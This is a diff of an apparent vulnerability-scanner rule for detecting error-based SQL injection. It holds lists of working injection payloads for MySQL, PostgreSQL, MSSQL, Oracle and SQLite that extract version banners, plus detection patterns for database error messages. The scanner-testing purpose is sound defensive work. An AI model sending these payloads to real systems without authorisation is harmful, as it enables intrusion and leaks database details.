@@ -5,7 +5,6 @@ transform:
   query:
     transformations:
       - replace_all_values_one_by_one:
-          # ── Unclosed quotes / broken syntax (universal) ──
           - "'"
           - "'\"'"
           - "' AND '"
@@ -14,36 +13,30 @@ transform:
           - "')--"
           - "\")"
           - "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b6a6271,(SELECT (ELT(1=1,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
-          # ── MySQL error extractors ──
           - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
           - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
           - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
           - "' AND EXP(~(SELECT * FROM (SELECT version())a))--"
           - "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
           - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          # ── PostgreSQL error extractors ──
           - "' AND 1=CAST((SELECT version()) AS int)--"
           - "' AND 1=CAST(chr(126)||version()||chr(126) AS int)--"
           - "';SELECT CAST(version() AS int)--"
           - "' AND TO_NUMBER(version(),'9')=0--"
-          # ── MSSQL error extractors ──
           - "' AND 1=CONVERT(int,(SELECT @@version))--"
           - "' AND 1=CONVERT(int,DB_NAME())--"
           - "';DECLARE @v INT=CAST(@@version AS INT)--"
           - "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--"
-          # ── Oracle error extractors ──
           - "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
           - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
           - "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--"
           - "' OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--"
-          # ── SQLite error extractors ──
           - "' AND 1=CAST(sqlite_version() AS int)--"
           - "' UNION SELECT CAST(sqlite_version() AS int)--"
           - "' AND TYPEOF(ZEROBLOB(-1))--"
   body:
     transformations:
       - replace_all_values_one_by_one:
-          # ── Unclosed quotes / broken syntax (universal) ──
           - "'"
           - "'\"'"
           - "' AND '"
@@ -52,176 +45,148 @@ transform:
           - "')--"
           - "\")"
           - "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b6a6271,(SELECT (ELT(1=1,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
-          # ── MySQL error extractors ──
           - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
           - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
           - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
           - "' AND EXP(~(SELECT * FROM (SELECT version())a))--"
           - "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--"
           - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          # ── PostgreSQL error extractors ──
           - "' AND 1=CAST((SELECT version()) AS int)--"
           - "' AND 1=CAST(chr(126)||version()||chr(126) AS int)--"
           - "';SELECT CAST(version() AS int)--"
           - "' AND TO_NUMBER(version(),'9')=0--"
-          # ── MSSQL error extractors ──
           - "' AND 1=CONVERT(int,(SELECT @@version))--"
           - "' AND 1=CONVERT(int,DB_NAME())--"
           - "';DECLARE @v INT=CAST(@@version AS INT)--"
           - "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--"
-          # ── Oracle error extractors ──
           - "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
           - "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
           - "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--"
           - "' OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),user,user)--"
-          # ── SQLite error extractors ──
           - "' AND 1=CAST(sqlite_version() AS int)--"
           - "' UNION SELECT CAST(sqlite_version() AS int)--"
           - "' AND TYPEOF(ZEROBLOB(-1))--"
   header:
     transformations:
       - replace_all_values_one_by_one:
-          # ── Unclosed quotes / broken syntax (universal) ──
           - "'"
           - "'\"'"
           - "' AND '"
           - "\"--"
           - "';"
-          # ── MySQL ──
           - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
           - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
-          # ── PostgreSQL ──
           - "' AND 1=CAST((SELECT version()) AS int)--"
-          # ── MSSQL ──
           - "' AND 1=CONVERT(int,(SELECT @@version))--"
 
 match_on:
   body:
     contains:
-      # ── MySQL ────────────────────────────────────────────────────────────────
-      # These strings come verbatim from MySQL/MariaDB engine error output and
-      # are extremely unlikely to appear in normal application responses.
 
       - "You have an error in your SQL syntax; check the manual"
-        # Full canonical MySQL syntax error prefix — not echoed from user input
       - "supplied argument is not a valid MySQL result"
-        # PHP mysql_* legacy error — highly specific
-      - "mysql_fetch_array\\(\\) expects parameter 1 to be resource"
-        # Exact PHP mysql_fetch_array() error text
-      - "mysql_num_rows\\(\\) expects parameter 1 to be resource"
-        # Exact PHP mysql_num_rows() error text
-      - "mysql_fetch_assoc\\(\\) expects parameter 1 to be resource"
-        # Exact PHP mysql_fetch_assoc() error text
+      - value: 'mysql_fetch_array\(\) expects parameter 1 to be resource'
+        options:
+          regex: true
+      - value: 'mysql_num_rows\(\) expects parameter 1 to be resource'
+        options:
+          regex: true
+      - value: 'mysql_fetch_assoc\(\) expects parameter 1 to be resource'
+        options:
+          regex: true
       - "Duplicate entry '"
-        # MySQL FLOOR(RAND()) GROUP BY duplicate key error — triggers on our payload
       - "XPATH syntax error: '~"
-        # EXTRACTVALUE() tilde delimiter in XML path error output — our payload marker
       - "XPATH syntax error: '~"
-        # Alternative: space before tilde (MariaDB variants)
       - "Got error 'repeated'"
-        # MySQL GTID_SUBSET error format
-      - "Double value out of range in 'exp\\(~"
-        # MySQL EXP(~(SELECT...)) out-of-range error — exact payload trigger
+      - value: 'Double value out of range in ''exp\(~'
+        options:
+          regex: true
 
-      # ── PostgreSQL ───────────────────────────────────────────────────────────
       - "ERROR:  invalid input syntax for type integer:"
-        # Exact Postgres cast-failure message — our CAST(version() AS int) payload
       - "ERROR:  unterminated quoted string at or near"
-        # Postgres tokenizer error — specific to unclosed quote injection
-      - "ERROR:  syntax error at or near \""
-        # Postgres parser error with quote context
+      - "ERROR:  syntax error at or near \\\""
       - "ERROR:  operator does not exist: integer ="
-        # Postgres type-mismatch error
       - "ERROR:  current transaction is aborted, commands ignored until end of transaction block"
-        # Postgres transaction abort state — only triggered after a real SQL error
       - "invalid byte sequence for encoding"
-        # Postgres encoding error triggered by binary payload injection
       - "column reference"
-        # Postgres "column reference X is ambiguous" — injection artifact
 
-      # ── MSSQL ────────────────────────────────────────────────────────────────
       - "Unclosed quotation mark after the character string"
-        # MSSQL verbatim quote error — single-quote injection trigger
       - "Conversion failed when converting the"
-        # MSSQL CONVERT(int,...) failure — exact our payload output
       - "Error converting data type"
-        # MSSQL CAST/CONVERT alternative error phrasing
       - "Microsoft OLE DB Provider for SQL Server"
-        # MSSQL OLE DB error provider banner
       - "Microsoft SQL Server Native Client"
-        # MSSQL native client error banner
       - "SQLServer JDBC Driver"
-        # MSSQL JDBC driver error banner (Java stack)
-      - "\\[Microsoft\\]\\[ODBC SQL Server Driver\\]"
-        # MSSQL ODBC driver error — bracket format unique to MSSQL
-      - "\\[SQL Server\\]"
-        # MSSQL error suffix tag in ODBC errors
+      - value: '\[Microsoft\]\[ODBC SQL Server Driver\]'
+        options:
+          regex: true
+      - value: '\[SQL Server\]'
+        options:
+          regex: true
       - "Incorrect syntax near '"
-        # MSSQL syntax error with context quote — payload trigger artifact
-      - "Statement\\(s\\) could not be prepared"
-        # MSSQL prepared statement failure on syntax break
+      - value: 'Statement\(s\) could not be prepared'
+        options:
+          regex: true
 
-      # ── Oracle ───────────────────────────────────────────────────────────────
       - "ORA-00907:"
-        # Missing right parenthesis — common Oracle syntax injection error
       - "ORA-00933:"
-        # SQL command not properly ended
       - "ORA-00936:"
-        # Missing expression — unclosed quote artifact
       - "ORA-01756:"
-        # Quoted string not properly terminated
       - "ORA-01789:"
-        # Query block has incorrect number of result columns
       - "ORA-06512:"
-        # PL/SQL stack trace line — present in UTL_INADDR / CTXSYS error output
       - "ORA-29257:"
-        # UTL_INADDR host unknown — exact trigger for our UTL_INADDR payload
       - "ORA-20001:"
-        # CTXSYS.DRITHSX application-defined error code
-      - "oracle\.jdbc\.driver\.OracleDriver"
-        # Oracle JDBC driver class name in Java stack trace
-      - "oracle\.jdbc\.OracleConnection"
-        # Oracle JDBC connection error in Java stack trace
+      - value: 'oracle\.jdbc\.driver\.OracleDriver'
+        options:
+          regex: true
+      - value: 'oracle\.jdbc\.OracleConnection'
+        options:
+          regex: true
 
-      # ── SQLite ───────────────────────────────────────────────────────────────
       - "SQLITE_ERROR SQL error or missing database"
-        # Exact SQLite3 C API error string
-      - "SQLite3::query\\(\\): Unable to execute a query"
-        # PHP SQLite3 class verbatim error
-      - "sqlite3\.OperationalError:"
-        # Python sqlite3 exception class prefix — colon makes it specific
-      - "unrecognized token: \"'"
-        # SQLite tokenizer error with the injected quote character
-      - "near \"\\.\":\ syntax error"
-        # SQLite near-token syntax error — triggered by our period-injection payloads
+      - value: 'SQLite3::query\(\): Unable to execute a query'
+        options:
+          regex: true
+      - value: 'sqlite3\.OperationalError:'
+        options:
+          regex: true
+      - "unrecognized token: \\\"'"
+      - value: 'near \"\.\":\ syntax error'
+        options:
+          regex: true
 
-      # ── Generic DB framework errors ──────────────────────────────────────────
-      - "SQLSTATE\\[42000\\]"
-        # SQLSTATE 42000 = syntax error or access violation — DB-agnostic but specific
-      - "SQLSTATE\\[HY000\\]"
-        # SQLSTATE HY000 = general error — only in real DB error responses
-      - "SQLSTATE\\[22007\\]"
-        # SQLSTATE 22007 = invalid datetime format — type-cast payload trigger
-      - "SQLSTATE\\[22P02\\]"
-        # PostgreSQL SQLSTATE for invalid text representation (CAST failure)
-      - "java\.sql\.SQLException:"
-        # Java JDBC exception class with colon — stack trace artifact
-      - "org\.hibernate\.exception\.SQLGrammarException"
-        # Hibernate ORM grammar exception — SQL syntax error in Java apps
-      - "org\.hibernate\.exception\.DataException"
-        # Hibernate data conversion exception
+      - value: 'SQLSTATE\[42000\]'
+        options:
+          regex: true
+      - value: 'SQLSTATE\[HY000\]'
+        options:
+          regex: true
+      - value: 'SQLSTATE\[22007\]'
+        options:
+          regex: true
+      - value: 'SQLSTATE\[22P02\]'
+        options:
+          regex: true
+      - value: 'java\.sql\.SQLException:'
+        options:
+          regex: true
+      - value: 'org\.hibernate\.exception\.SQLGrammarException'
+        options:
+          regex: true
+      - value: 'org\.hibernate\.exception\.DataException'
+        options:
+          regex: true
       - "PDOException: SQLSTATE"
-        # PHP PDO exception with SQLSTATE — combined for specificity
-      - "System\.Data\.SqlClient\.SqlException"
-        # .NET SqlClient exception class — highly specific to MSSQL/.NET stack
-      - "Npgsql\.NpgsqlException"
-        # .NET PostgreSQL driver exception class
+      - value: 'System\.Data\.SqlClient\.SqlException'
+        options:
+          regex: true
+      - value: 'Npgsql\.NpgsqlException'
+        options:
+          regex: true
       - "ActiveRecord::StatementInvalid"
-        # Ruby on Rails DB error — SQL statement failed
       - "PG::SyntaxError:"
-        # Ruby pg gem syntax error class — colon makes it precise
-      - "Caused by: java\.sql\.SQLSyntaxErrorException"
-        # Java SQL syntax exception in stack trace — injection evidence
+      - value: 'Caused by: java\.sql\.SQLSyntaxErrorException'
+        options:
+          regex: true
 
 report:
   title: "Error-based SQL Injection indicators found"
